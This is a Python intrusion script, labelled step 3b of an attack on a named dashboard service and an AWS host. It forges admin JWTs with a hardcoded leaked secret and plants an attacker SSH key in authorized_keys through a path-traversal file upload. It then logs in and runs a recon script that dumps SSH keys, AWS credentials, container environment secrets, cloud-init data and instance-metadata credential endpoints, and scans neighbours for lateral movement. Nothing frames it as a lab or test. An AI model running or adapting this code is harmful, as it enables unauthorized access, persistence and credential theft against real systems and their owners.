#!/usr/bin/env python3
# i29233 step 3b: we have coder(sudo,docker) on intelora12 (54.179.173.218).
# Loot host: ssh keys, aws configs, docker containers/env, cloud-init user-data, internal neighbours,
# and check for a fleet-hop key to reach other instances (which may carry a more privileged role).
import os, sys, json, base64, hmac, hashlib, subprocess, random, string, time
import urllib.parse as up

HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
AGENT = "agent-0cf829f4"; AUID = "4b4f439e-74f7-11f1-ac43-525400595be1"; ACUST = "tianyue"; AIP = "54.179.173.218"
def _b64(s): return base64.b64encode(s.encode("utf-8", "replace")).decode()
def R(k, v):
    s = v if isinstance(v, str) else json.dumps(v, ensure_ascii=False, default=str)
    print("R:%s:%s" % (k, _b64(s)), flush=True)
def sh(a, timeout=90, env=None):
    try:
        r = subprocess.run(a, capture_output=True, timeout=timeout, env=env)
        return r.returncode, r.stdout.decode("utf-8", "replace"), r.stderr.decode("utf-8", "replace")
    except Exception as e:
        return -1, "", repr(e)
def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def forge(p):
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    pl = b64u(json.dumps(p, separators=(",", ":")))
    return h + "." + pl + "." + b64u(hmac.new(JWT_SECRET.encode(), (h + "." + pl).encode(), hashlib.sha256).digest())
def tok_for(uid, cust): return forge({"userId": uid, "email": "probe@x", "customer": cust, "role": "admin"})
def curl(args, timeout=40): return sh(["curl", "-s", "-k", "-m", str(timeout)] + args, timeout=timeout + 15)
def call(path, cookie=None, timeout=30, maxlen=20000):
    args = ["--http2", "-A", UA, "-H", "Accept: application/json", "-w", "\n__CODE__%{http_code}"]
    if cookie: args += ["-H", "Cookie: session=" + cookie]
    args += ["https://%s%s" % (HOST, path)]
    rc, out, err = curl(args, timeout=timeout)
    i = out.rfind("__CODE__"); code = ""; txt = out
    if i >= 0: code = out[i+8:].strip()[:3]; txt = out[:i]
    return {"code": code, "body": txt[:maxlen]}
def files_read(aid, path, tok, maxlen=20000):
    return call("/api/agents/%s/files?action=read&path=%s" % (aid, up.quote(path, safe="/")), cookie=tok, maxlen=maxlen)
def upload(aid, tok, path, name, content, timeout=60):
    tmp = "/tmp/u_%d" % random.randint(1000, 999999)
    open(tmp, "wb").write(content.encode() if isinstance(content, str) else content)
    url = "https://%s/api/agents/%s/files/upload?path=%s" % (HOST, aid, up.quote(path, safe="/"))
    rc, out, err = curl(["--http2", "-A", UA, "-H", "Authorization: Bearer " + tok, "-w", "\n__CODE__%{http_code}",
                         "-F", "files=@%s;filename=%s" % (tmp, name), url], timeout=timeout)
    i = out.rfind("__CODE__"); code = ""; txt = out
    if i >= 0: code = out[i+8:].strip()[:3]; txt = out[:i]
    return {"code": code, "body": txt[:1500]}

RECON = r'''
set +e
H=/home/lumii
echo "=== id/sudo ==="; id; hostname; sudo -n id 2>&1; sudo -n -l 2>&1 | head -8
echo "=== osrelease ==="; cat /etc/os-release 2>/dev/null | head -3; uname -a
echo "=== whoami=$(whoami) HOME=$HOME ==="; ls -la /home
echo "=== coder .ssh ==="; ls -la /home/coder/.ssh 2>&1; for f in /home/coder/.ssh/*; do echo "--- $f ---"; case "$f" in *.pub|*known_hosts*|*config*) cat "$f";; *) if grep -q "PRIVATE KEY" "$f" 2>/dev/null; then sed -n '1,3p' "$f"; echo "...[PRIVATEKEY-TRUNC]"; fi;; esac; done
echo "=== coder aws ==="; ls -la /home/coder/.aws 2>&1; cat /home/coder/.aws/credentials /home/coder/.aws/config 2>&1 | head -30
echo "=== lumii .ssh ==="; ls -la $H/.ssh 2>&1; cat $H/.ssh/authorized_keys 2>&1 | head -5
echo "=== lumii home files ==="; ls -la $H 2>&1
echo "=== .decart.env ==="; cat $H/.decart.env 2>&1
echo "=== env-ish files ==="; for f in $H/.env* $H/.config/*/.env* $H/.gstack/*.json $H/.lumii/*; do [ -f "$f" ] && { echo "--- $f ---"; head -c 500 "$f"; echo; }; done 2>/dev/null
echo "=== docker ps ==="; (docker ps -a --format '{{.Names}} | {{.Image}} | {{.Status}}' 2>&1 || sudo -n docker ps -a --format '{{.Names}} | {{.Image}} | {{.Status}}' 2>&1) | head -30
echo "=== docker env grep ==="; for c in $(sudo -n docker ps -q 2>/dev/null || docker ps -q 2>/dev/null); do echo "-- $c --"; (sudo -n docker inspect -f '{{.Name}} {{range .Config.Env}}{{println .}}{{end}}' $c 2>/dev/null | grep -iE 'aws|token|secret|key|pass|dsn|database|role' | head -12); done
echo "=== listen ==="; (sudo -n ss -tlnp 2>/dev/null || ss -tln 2>/dev/null) | head -25
echo "=== neigh ==="; (sudo -n ip neigh 2>/dev/null || ip neigh 2>/dev/null) | head -30
echo "=== hosts/resolv ==="; cat /etc/hosts; echo; head -5 /etc/resolv.conf
echo "=== cloud-init ==="; sudo -n sh -c 'ls -la /var/lib/cloud/instance/ 2>/dev/null; head -c 1200 /var/lib/cloud/instance/user-data.txt 2>/dev/null'; echo
echo "=== imds info ==="; curl -s -m4 http://169.254.169.254/latest/meta-data/iam/info; echo; curl -s -m4 http://169.254.169.254/latest/meta-data/network/interfaces/macs/ | head -3; echo; curl -s -m4 http://169.254.169.254/latest/meta-data/services/domain; echo
echo "=== ecs/cred endpoints ==="; curl -s -m3 -o /dev/null -w 'ecs170_2=%{http_code}\n' http://169.254.170.2/v2/credentials/; curl -s -m3 -o /dev/null -w 'containercreds=%{http_code}\n' http://169.254.170.2/
echo "=== s3 refs ==="; sudo -n sh -c 'grep -rIl "s3://" /home /opt /etc /srv /usr/local/bin 2>/dev/null | head -10'
echo "=== ssh configs ==="; cat /home/coder/.ssh/config 2>/dev/null; cat $H/.ssh/config 2>/dev/null
echo "=== fleet hop test (22 from here) ==="; for ip in $( (sudo -n ip neigh 2>/dev/null || ip neigh 2>/dev/null) | awk "{print \$1}" | head -12); do timeout 2 bash -c "</dev/tcp/$ip/22" 2>/dev/null && echo "SSH-OPEN $ip"; done
echo "=== END ==="
'''

def main():
    tok = tok_for(AUID, ACUST)
    me = call("/api/auth/me", cookie=tok_for("usr_ZxLewKrgbRYSm7rWDtQX8", "aro"), maxlen=300)
    R("me", me)
    cur = files_read(AGENT, "/home/lumii/.ssh/authorized_keys", tok, maxlen=8000)
    R("authkeys_cur", cur)
    try: orig = json.loads(cur["body"]).get("content", "") or ""
    except Exception: orig = ""
    kp = "/tmp/k29233b"
    sh(["rm", "-f", kp, kp + ".pub"])
    sh(["ssh-keygen", "-t", "ed25519", "-N", "", "-f", kp, "-C", "i29233b"], timeout=30)
    priv = open(kp).read(); pub = open(kp + ".pub").read().strip()
    R("privkey_b64", base64.b64encode(priv.encode()).decode())
    R("pub", pub)
    combined = (orig.rstrip("\n") + "\n" if orig.strip() else "") + pub + "\n"
    R("upl", upload(AGENT, tok, "/home/lumii/.lumii-agent-keeper/../.ssh", "authorized_keys", combined))
    ver = files_read(AGENT, "/home/lumii/.ssh/authorized_keys", tok, maxlen=8000)
    R("verify", ver)
    try:
        p = subprocess.run(["ssh", "-i", kp, "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no",
                            "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=10",
                            "coder@" + AIP, "bash -s"], input=RECON.encode(), capture_output=True, timeout=200)
        R("recon", {"rc": p.returncode, "out": p.stdout.decode("utf-8", "replace")[:18000],
                    "err": p.stderr.decode("utf-8", "replace")[:600]})
    except Exception as e:
        R("recon_fail", repr(e))
    R("END", {"ok": 1})

try:
    main()
except Exception:
    import traceback; R("FATAL", traceback.format_exc()[-3000:])
finally:
    sys.exit(1)
